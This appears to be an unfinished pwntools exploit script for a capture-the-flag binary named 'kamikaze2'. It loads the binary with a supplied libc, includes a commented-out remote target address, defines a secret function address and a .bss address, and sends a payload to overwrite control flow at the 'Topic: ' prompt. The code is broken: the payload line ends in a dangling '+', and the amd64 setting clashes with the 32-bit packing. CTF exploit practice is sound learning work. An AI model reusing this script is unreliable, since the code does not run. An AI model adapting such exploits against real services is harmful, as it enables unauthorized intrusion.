from pwn import *
context.arch = 'amd64'

#     nc 13.48.67.196 50000

# r = remote('13.48.67.196', 50000)

r = process('./kamikaze2', env={"LD_PRELOAD" : "./libc-2.27.so"})

secret_func = 0x8420736
bss_addr = 0x08422044

payload = p32(bss_addr) + 
pause()

r.sendlineafter('Topic: ', payload)
r.interactive()
